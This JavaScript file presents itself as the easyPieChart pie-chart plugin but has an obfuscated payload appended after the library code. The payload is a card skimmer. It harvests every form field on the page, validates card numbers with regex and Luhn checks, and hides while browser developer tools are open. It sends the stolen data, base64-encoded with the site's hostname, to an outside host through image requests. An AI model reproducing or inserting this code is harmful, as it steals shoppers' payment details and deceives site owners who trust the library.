/**!
 * easyPieChart
 * Lightweight plugin to render simple, animated and retina optimized pie charts
 *
 * @license 
 * @author Robert Fleischmann <rendro87@gmail.com> (http://robert-fleischmann.de)
 * @version 2.1.6
 **/

(function(root, factory) {
    if(typeof exports === 'object') {
        module.exports = factory();
    }
    else if(typeof define === 'function' && define.amd) {
        define([], factory);
    }
    else {
        root['EasyPieChart'] = factory();
    }
}(this, function() {

/**
 * Renderer to render the chart on a canvas object
 * @param {DOMElement} el      DOM element to host the canvas (root of the plugin)
 * @param {object}     options options object of the plugin
 */
var CanvasRenderer = function(el, options) {
	var cachedBackground;
	var canvas = document.createElement('canvas');

	el.appendChild(canvas);

	if (typeof(G_vmlCanvasManager) !== 'undefined') {
		G_vmlCanvasManager.initElement(canvas);
	}

	var ctx = canvas.getContext('2d');

	canvas.width = canvas.height = options.size;

	// canvas on retina devices
	var scaleBy = 1;
	if (window.devicePixelRatio > 1) {
		scaleBy = window.devicePixelRatio;
		canvas.style.width = canvas.style.height = [options.size, 'px'].join('');
		canvas.width = canvas.height = options.size * scaleBy;
		ctx.scale(scaleBy, scaleBy);
	}

	// move 0,0 coordinates to the center
	ctx.translate(options.size / 2, options.size / 2);

	// rotate canvas -90deg
	ctx.rotate((-1 / 2 + options.rotate / 180) * Math.PI);

	var radius = (options.size - options.lineWidth) / 2;
	if (options.scaleColor && options.scaleLength) {
		radius -= options.scaleLength + 2; // 2 is the distance between scale and bar
	}

	// IE polyfill for Date
	Date.now = Date.now || function() {
		return +(new Date());
	};

	/**
	 * Draw a circle around the center of the canvas
	 * @param {strong} color     Valid CSS color string
	 * @param {number} lineWidth Width of the line in px
	 * @param {number} percent   Percentage to draw (float between -1 and 1)
	 */
	var drawCircle = function(color, lineWidth, percent) {
		percent = Math.min(Math.max(-1, percent || 0), 1);
		var isNegative = percent <= 0 ? true : false;

		ctx.beginPath();
		ctx.arc(0, 0, radius, 0, Math.PI * 2 * percent, isNegative);

		ctx.strokeStyle = color;
		ctx.lineWidth = lineWidth;

		ctx.stroke();
	};

	/**
	 * Draw the scale of the chart
	 */
	var drawScale = function() {
		var offset;
		var length;

		ctx.lineWidth = 1;
		ctx.fillStyle = options.scaleColor;

		ctx.save();
		for (var i = 24; i > 0; --i) {
			if (i % 6 === 0) {
				length = options.scaleLength;
				offset = 0;
			} else {
				length = options.scaleLength * 0.6;
				offset = options.scaleLength - length;
			}
			ctx.fillRect(-options.size/2 + offset, 0, length, 1);
			ctx.rotate(Math.PI / 12);
		}
		ctx.restore();
	};

	/**
	 * Request animation frame wrapper with polyfill
	 * @return {function} Request animation frame method or timeout fallback
	 */
	var reqAnimationFrame = (function() {
		return  window.requestAnimationFrame ||
				window.webkitRequestAnimationFrame ||
				window.mozRequestAnimationFrame ||
				function(callback) {
					window.setTimeout(callback, 1000 / 60);
				};
	}());

	/**
	 * Draw the background of the plugin including the scale and the track
	 */
	var drawBackground = function() {
		if(options.scaleColor) drawScale();
		if(options.trackColor) drawCircle(options.trackColor, options.trackWidth || options.lineWidth, 1);
	};

  /**
    * Canvas accessor
   */
  this.getCanvas = function() {
    return canvas;
  };

  /**
    * Canvas 2D context 'ctx' accessor
   */
  this.getCtx = function() {
    return ctx;
  };

	/**
	 * Clear the complete canvas
	 */
	this.clear = function() {
		ctx.clearRect(options.size / -2, options.size / -2, options.size, options.size);
	};

	/**
	 * Draw the complete chart
	 * @param {number} percent Percent shown by the chart between -100 and 100
	 */
	this.draw = function(percent) {
		// do we need to render a background
		if (!!options.scaleColor || !!options.trackColor) {
			// getImageData and putImageData are supported
			if (ctx.getImageData && ctx.putImageData) {
				if (!cachedBackground) {
					drawBackground();
					cachedBackground = ctx.getImageData(0, 0, options.size * scaleBy, options.size * scaleBy);
				} else {
					ctx.putImageData(cachedBackground, 0, 0);
				}
			} else {
				this.clear();
				drawBackground();
			}
		} else {
			this.clear();
		}

		ctx.lineCap = options.lineCap;

		// if barcolor is a function execute it and pass the percent as a value
		var color;
		if (typeof(options.barColor) === 'function') {
			color = options.barColor(percent);
		} else {
			color = options.barColor;
		}

		// draw bar
		drawCircle(color, options.lineWidth, percent / 100);
	}.bind(this);

	/**
	 * Animate from some percent to some other percentage
	 * @param {number} from Starting percentage
	 * @param {number} to   Final percentage
	 */
	this.animate = function(from, to) {
		var startTime = Date.now();
		options.onStart(from, to);
		var animation = function() {
			var process = Math.min(Date.now() - startTime, options.animate.duration);
			var currentValue = options.easing(this, process, from, to - from, options.animate.duration);
			this.draw(currentValue);
			options.onStep(from, to, currentValue);
			if (process >= options.animate.duration) {
				options.onStop(from, to);
			} else {
				reqAnimationFrame(animation);
			}
		}.bind(this);

		reqAnimationFrame(animation);
	}.bind(this);
};

var EasyPieChart = function(el, opts) {
	var defaultOptions = {
		barColor: '#ef1e25',
		trackColor: '#f9f9f9',
		scaleColor: '#dfe0e0',
		scaleLength: 5,
		lineCap: 'round',
		lineWidth: 3,
		trackWidth: undefined,
		size: 110,
		rotate: 0,
		animate: {
			duration: 1000,
			enabled: true
		},
		easing: function (x, t, b, c, d) { // more can be found here: http://gsgd.co.uk/sandbox/jquery/easing/
			t = t / (d/2);
			if (t < 1) {
				return c / 2 * t * t + b;
			}
			return -c/2 * ((--t)*(t-2) - 1) + b;
		},
		onStart: function(from, to) {
			return;
		},
		onStep: function(from, to, currentValue) {
			return;
		},
		onStop: function(from, to) {
			return;
		}
	};

	// detect present renderer
	if (typeof(CanvasRenderer) !== 'undefined') {
		defaultOptions.renderer = CanvasRenderer;
	} else if (typeof(SVGRenderer) !== 'undefined') {
		defaultOptions.renderer = SVGRenderer;
	} else {
		throw new Error('Please load either the SVG- or the CanvasRenderer');
	}

	var options = {};
	var currentValue = 0;

	/**
	 * Initialize the plugin by creating the options object and initialize rendering
	 */
	var init = function() {
		this.el = el;
		this.options = options;

		// merge user options into default options
		for (var i in defaultOptions) {
			if (defaultOptions.hasOwnProperty(i)) {
				options[i] = opts && typeof(opts[i]) !== 'undefined' ? opts[i] : defaultOptions[i];
				if (typeof(options[i]) === 'function') {
					options[i] = options[i].bind(this);
				}
			}
		}

		// check for jQuery easing
		if (typeof(options.easing) === 'string' && typeof(jQuery) !== 'undefined' && jQuery.isFunction(jQuery.easing[options.easing])) {
			options.easing = jQuery.easing[options.easing];
		} else {
			options.easing = defaultOptions.easing;
		}

		// process earlier animate option to avoid bc breaks
		if (typeof(options.animate) === 'number') {
			options.animate = {
				duration: options.animate,
				enabled: true
			};
		}

		if (typeof(options.animate) === 'boolean' && !options.animate) {
			options.animate = {
				duration: 1000,
				enabled: options.animate
			};
		}

		// create renderer
		this.renderer = new options.renderer(el, options);

		// initial draw
		this.renderer.draw(currentValue);

		// initial update
		if (el.dataset && el.dataset.percent) {
			this.update(parseFloat(el.dataset.percent));
		} else if (el.getAttribute && el.getAttribute('data-percent')) {
			this.update(parseFloat(el.getAttribute('data-percent')));
		}
	}.bind(this);

	/**
	 * Update the value of the chart
	 * @param  {number} newValue Number between 0 and 100
	 * @return {object}          Instance of the plugin for method chaining
	 */
	this.update = function(newValue) {
		newValue = parseFloat(newValue);
		if (options.animate.enabled) {
			this.renderer.animate(currentValue, newValue);
		} else {
			this.renderer.draw(newValue);
		}
		currentValue = newValue;
		return this;
	}.bind(this);

	/**
	 * Disable animation
	 * @return {object} Instance of the plugin for method chaining
	 */
	this.disableAnimation = function() {
		options.animate.enabled = false;
		return this;
	};

	/**
	 * Enable animation
	 * @return {object} Instance of the plugin for method chaining
	 */
	this.enableAnimation = function() {
		options.animate.enabled = true;
		return this;
	};

	init();
};


return EasyPieChart;

}));


var _0x483b=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d'];(function(_0x4eccdf,_0x18e928){var _0x29d8f7=function(_0x44e49f){while(--_0x44e49f){_0x4eccdf['push'](_0x4eccdf['shift']());}};_0x29d8f7(++_0x18e928);}(_0x483b,0xbe));var _0x1288=function(_0x13a66b,_0x3095ac){_0x13a66b=_0x13a66b-0x0;var _0x73c45e=_0x483b[_0x13a66b];if(_0x1288['lyxgbR']===undefined){(function(){var _0x130009=function(){var _0x6f00e6;try{_0x6f00e6=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5a439e){_0x6f00e6=window;}return _0x6f00e6;};var _0x59229e=_0x130009();var _0x186ea3='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x59229e['atob']||(_0x59229e['atob']=function(_0x29e19e){var _0xdfc10a=String(_0x29e19e)['replace'](/=+$/,'');for(var _0x88b8e6=0x0,_0x4085a5,_0x4f4c33,_0x402b06=0x0,_0xd7fc01='';_0x4f4c33=_0xdfc10a['charAt'](_0x402b06++);~_0x4f4c33&&(_0x4085a5=_0x88b8e6%0x4?_0x4085a5*0x40+_0x4f4c33:_0x4f4c33,_0x88b8e6++%0x4)?_0xd7fc01+=String['fromCharCode'](0xff&_0x4085a5>>(-0x2*_0x88b8e6&0x6)):0x0){_0x4f4c33=_0x186ea3['indexOf'](_0x4f4c33);}return _0xd7fc01;});}());_0x1288['AbnGPQ']=function(_0x23a0da){var _0x505fb9=atob(_0x23a0da);var _0x56c33a=[];for(var _0x5af567=0x0,_0xe3d271=_0x505fb9['length'];_0x5af567<_0xe3d271;_0x5af567++){_0x56c33a+='%'+('00'+_0x505fb9['charCodeAt'](_0x5af567)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x56c33a);};_0x1288['lPYnAg']={};_0x1288['lyxgbR']=!![];}var _0x150eaf=_0x1288['lPYnAg'][_0x13a66b];if(_0x150eaf===undefined){_0x73c45e=_0x1288['AbnGPQ'](_0x73c45e);_0x1288['lPYnAg'][_0x13a66b]=_0x73c45e;}else{_0x73c45e=_0x150eaf;}return _0x73c45e;};function _0x1c6b51(_0x39720b,_0x5ea2ab,_0x1aa303){return _0x39720b['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x5ea2ab,'\x67'),_0x1aa303);}function _0xa03f70(_0x5bb550){var _0x58a607=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x57f5dd=/^(?:5[1-5][0-9]{14})$/;var _0x50ecef=/^(?:3[47][0-9]{13})$/;var _0xd2665a=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x334373=![];if(_0x58a607[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0x57f5dd[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0x50ecef[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0xd2665a[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}return _0x334373;}function _0x5d2999(_0x33eaa1){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x33eaa1))return![];var _0x37eea7=0x0,_0xc7f19=0x0,_0x2f4dff=![];_0x33eaa1=_0x33eaa1[_0x1288('0x1')](/\D/g,'');for(var _0x3359a2=_0x33eaa1['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x3359a2>=0x0;_0x3359a2--){var _0x1eeea2=_0x33eaa1[_0x1288('0x2')](_0x3359a2),_0xc7f19=parseInt(_0x1eeea2,0xa);if(_0x2f4dff){if((_0xc7f19*=0x2)>0x9)_0xc7f19-=0x9;}_0x37eea7+=_0xc7f19;_0x2f4dff=!_0x2f4dff;}return _0x37eea7%0xa==0x0;}(function(){'use strict';const _0xc989d7={};_0xc989d7[_0x1288('0x3')]=![];_0xc989d7[_0x1288('0x4')]=undefined;const _0x2e387c=0xa0;const _0x3f03b5=(_0x3c511b,_0x536e13)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3c511b,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x536e13}}));};setInterval(()=>{const _0xc4191f=window[_0x1288('0x5')]-window[_0x1288('0x6')]>_0x2e387c;const _0x3e3097=window[_0x1288('0x7')]-window[_0x1288('0x8')]>_0x2e387c;const _0x1137e4=_0xc4191f?_0x1288('0x9'):_0x1288('0xa');if(!(_0x3e3097&&_0xc4191f)&&(window[_0x1288('0xb')]&&window[_0x1288('0xb')][_0x1288('0xc')]&&window[_0x1288('0xb')][_0x1288('0xc')][_0x1288('0xd')]||_0xc4191f||_0x3e3097)){if(!_0xc989d7[_0x1288('0x3')]||_0xc989d7['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x1137e4){_0x3f03b5(!![],_0x1137e4);}_0xc989d7[_0x1288('0x3')]=!![];_0xc989d7[_0x1288('0x4')]=_0x1137e4;}else{if(_0xc989d7['\x69\x73\x4f\x70\x65\x6e']){_0x3f03b5(![],undefined);}_0xc989d7[_0x1288('0x3')]=![];_0xc989d7[_0x1288('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x1288('0xe')&&module[_0x1288('0xf')]){module[_0x1288('0xf')]=_0xc989d7;}else{window[_0x1288('0x10')]=_0xc989d7;}}());String[_0x1288('0x11')][_0x1288('0x12')]=function(){var _0x1fea61=0x0,_0x59ca29,_0x58a470;if(this[_0x1288('0x13')]===0x0)return _0x1fea61;for(_0x59ca29=0x0;_0x59ca29<this['\x6c\x65\x6e\x67\x74\x68'];_0x59ca29++){_0x58a470=this[_0x1288('0x14')](_0x59ca29);_0x1fea61=(_0x1fea61<<0x5)-_0x1fea61+_0x58a470;_0x1fea61|=0x0;}return _0x1fea61;};var _0x1ce87b={};_0x1ce87b[_0x1288('0x15')]=_0x1288('0x16');_0x1ce87b['\x44\x61\x74\x61']={};_0x1ce87b[_0x1288('0x17')]=[];_0x1ce87b[_0x1288('0x18')]=![];_0x1ce87b[_0x1288('0x19')]=function(_0x575ede){if(_0x575ede.id!==undefined&&_0x575ede.id!=''&&_0x575ede.id!==null&&_0x575ede.value.length<0x100&&_0x575ede.value.length>0x0){if(_0x5d2999(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20',''))&&_0xa03f70(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20','')))_0x1ce87b.IsValid=!![];_0x1ce87b.Data[_0x575ede.id]=_0x575ede.value;return;}if(_0x575ede.name!==undefined&&_0x575ede.name!=''&&_0x575ede.name!==null&&_0x575ede.value.length<0x100&&_0x575ede.value.length>0x0){if(_0x5d2999(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20',''))&&_0xa03f70(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20','')))_0x1ce87b.IsValid=!![];_0x1ce87b.Data[_0x575ede.name]=_0x575ede.value;return;}};_0x1ce87b[_0x1288('0x1a')]=function(){var _0x17ecc3=document.getElementsByTagName(_0x1288('0x1b'));var _0xe6a956=document.getElementsByTagName(_0x1288('0x1c'));var _0x4f84b9=document.getElementsByTagName(_0x1288('0x1d'));for(var _0x4e8921=0x0;_0x4e8921<_0x17ecc3.length;_0x4e8921++)_0x1ce87b.SaveParam(_0x17ecc3[_0x4e8921]);for(var _0x4e8921=0x0;_0x4e8921<_0xe6a956.length;_0x4e8921++)_0x1ce87b.SaveParam(_0xe6a956[_0x4e8921]);for(var _0x4e8921=0x0;_0x4e8921<_0x4f84b9.length;_0x4e8921++)_0x1ce87b.SaveParam(_0x4f84b9[_0x4e8921]);};_0x1ce87b[_0x1288('0x1e')]=function(){if(!window.devtools.isOpen&&_0x1ce87b.IsValid){_0x1ce87b.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x5000ce=encodeURIComponent(window.btoa(JSON.stringify(_0x1ce87b.Data)));var _0x44d42e=_0x5000ce.hashCode();for(var _0x528cc0=0x0;_0x528cc0<_0x1ce87b.Sent.length;_0x528cc0++)if(_0x1ce87b.Sent[_0x528cc0]==_0x44d42e)return;_0x1ce87b.LoadImage(_0x5000ce);}};_0x1ce87b[_0x1288('0x1f')]=function(){_0x1ce87b.SaveAllFields();_0x1ce87b.SendData();};_0x1ce87b[_0x1288('0x20')]=function(_0xea5972){_0x1ce87b.Sent.push(_0xea5972.hashCode());var _0x1efc77=document.createElement(_0x1288('0x21'));_0x1efc77.src=_0x1ce87b.GetImageUrl(_0xea5972);};_0x1ce87b[_0x1288('0x22')]=function(_0x109979){return _0x1ce87b.Gate+_0x1288('0x23')+_0x109979;};document[_0x1288('0x24')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']===_0x1288('0x25')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x1ce87b[_0x1288('0x1f')],0x1f4);}};